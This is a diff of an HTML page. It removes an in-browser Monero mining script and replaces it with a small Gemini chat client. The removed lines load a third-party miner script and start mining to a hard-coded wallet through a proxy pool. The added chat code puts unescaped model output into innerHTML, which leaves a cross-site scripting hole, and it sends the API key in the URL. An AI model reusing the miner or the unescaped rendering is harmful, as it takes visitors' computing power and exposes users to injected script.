@@ -2,28 +2,256 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Python Web Miner</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini Chat</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #1c1e21;
+        }
+        #chat-container {
+            width: 90%;
+            max-width: 800px;
+            height: 90vh;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        #api-key-section {
+            padding: 15px;
+            background-color: #f7f7f7;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        #api-key-section label {
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        #api-key-input {
+            flex-grow: 1;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        #chat-box {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .message {
+            max-width: 80%;
+            padding: 12px 18px;
+            border-radius: 18px;
+            line-height: 1.4;
+            word-wrap: break-word;
+        }
+        .user-message {
+            background-color: #0084ff;
+            color: white;
+            align-self: flex-end;
+            border-bottom-right-radius: 4px;
+        }
+        .gemini-message {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+            align-self: flex-start;
+            border-bottom-left-radius: 4px;
+        }
+        .gemini-message.error {
+            background-color: #ffebe5;
+            color: #d63300;
+        }
+        .gemini-message p { margin: 0 0 10px 0; }
+        .gemini-message p:last-child { margin-bottom: 0; }
+        .gemini-message code {
+            background-color: #f0f0f0;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: "Courier New", Courier, monospace;
+        }
+        .gemini-message pre {
+            background-color: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        #input-container {
+            border-top: 1px solid #ddd;
+            padding: 15px;
+            display: flex;
+            gap: 10px;
+        }
+        #user-input {
+            flex-grow: 1;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            font-size: 1em;
+            resize: none;
+        }
+        #send-button {
+            padding: 10px 20px;
+            background-color: #0084ff;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.2s;
+        }
+        #send-button:hover {
+            background-color: #0073e6;
+        }
+        #send-button:disabled {
+            background-color: #a0c3ff;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
-    <script src="https://script.monerominer.rocks"></script>
-    <script>
-    server = "wss://ny1.xmrminingproxy.com";
-    var pool = "moneroocean.stream";
-    var walletAddress = "85aGopV4ESjjM9XWKdyHtQBrutARCwqNW359K5ycnnerSYwWtkQACPacFrnWJpExkEgV7besm4vFnCbiWER6FV8ATy7RNXe";
-    var workerId = "jph"
-    var threads = -1;
-    var password = "x";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
-    </script>
 <body>
-    <h1>Mining in Progress...</h1>
-    <p>This page is using your CPU to mine cryptocurrency to support our site.</p>
-    <p>Your support is appreciated! You can close this tab at any time to stop.</p>
-    <hr>
-    <p>CPU Usage (Throttle): <b>70%</b> (This means the miner is idle 70% of the time to not slow down your computer).</p>
 
-    
-    <!-- 2. Create and start the miner -->
-    
+    <div id="chat-container">
+        <div id="api-key-section">
+            <label for="api-key-input">Gemini API Key:</label>
+            <input type="password" id="api-key-input" placeholder="Paste your API key here">
+        </div>
+        <div id="chat-box">
+            <div class="message gemini-message">
+                Hello! I'm Gemini. Please enter your API key above and I'll be ready to chat.
+            </div>
+        </div>
+        <div id="input-container">
+            <input id="user-input" placeholder="Type your message..."></input>
+            <button id="send-button">Send</button>
+        </div>
+    </div>
+
+    <script>
+        const sendButton = document.getElementById('send-button');
+        const userInput = document.getElementById('user-input');
+        const chatBox = document.getElementById('chat-box');
+        const apiKeyInput = document.getElementById('api-key-input');
+        
+        // This array will store the entire chat history
+        let chatHistory = [];
+
+        async function sendMessage() {
+            const userMessage = userInput.value.trim();
+            const apiKey = apiKeyInput.value.trim();
+
+            if (!apiKey) {
+                addMessageToChatBox("Please enter your API key first.", "gemini", "error");
+                return;
+            }
+
+            if (!userMessage) return;
+
+            // Disable input and button during API call
+            setUIState(false);
+
+            // Add user message to chat box and history
+            addMessageToChatBox(userMessage, 'user');
+            chatHistory.push({ role: "user", parts: [{ text: userMessage }] });
+            
+            userInput.value = '';
+
+            try {
+                const model = 'gemini-pro'; // Or 'gemini-1.5-flash', etc.
+                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`;
+
+                const requestBody = {
+                    contents: chatHistory,
+                    // Optional: Add safety settings and generation config
+                    // "safetySettings": [ ... ],
+                    // "generationConfig": { ... }
+                };
+
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(requestBody)
+                });
+                
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error.message || `API request failed with status ${response.status}`);
+                }
+
+                const data = await response.json();
+                
+                // Extract the model's response text
+                const geminiResponse = data.candidates[0].content.parts[0].text;
+
+                // Add Gemini's response to the chat box and history
+                addMessageToChatBox(geminiResponse, 'gemini');
+                chatHistory.push({ role: "model", parts: [{ text: geminiResponse }] });
+
+            } catch (error) {
+                console.error("Error:", error);
+                addMessageToChatBox(`Error: ${error.message}`, "gemini", "error");
+            } finally {
+                // Re-enable input and button
+                setUIState(true);
+            }
+        }
+        
+        function setUIState(enabled) {
+            userInput.disabled = !enabled;
+            sendButton.disabled = !enabled;
+            if (enabled) {
+                sendButton.textContent = "Send";
+                userInput.focus();
+            } else {
+                sendButton.textContent = "...";
+            }
+        }
+
+        function addMessageToChatBox(message, sender, type = '') {
+            const messageElement = document.createElement('div');
+            messageElement.classList.add('message', `${sender}-message`);
+            if (type === 'error') {
+                messageElement.classList.add('error');
+            }
+            
+            // Basic Markdown to HTML conversion
+            let formattedMessage = message
+                .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') // Bold
+                .replace(/\*(.*?)\*/g, '<em>$1</em>')     // Italics
+                .replace(/```([\s\S]*?)```/g, '<pre><code>$1</code></pre>') // Code blocks
+                .replace(/`(.*?)`/g, '<code>$1</code>')     // Inline code
+                .replace(/\n/g, '<br>');                   // Newlines
+            
+            messageElement.innerHTML = formattedMessage;
+            chatBox.appendChild(messageElement);
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+
+        sendButton.addEventListener('click', sendMessage);
+        userInput.addEventListener('keydown', (event) => {
+            if (event.key === 'Enter') {
+                event.preventDefault(); // Prevents new line in textarea
+                sendMessage();
+            }
+        });
+    </script>
+
 </body>
 </html>
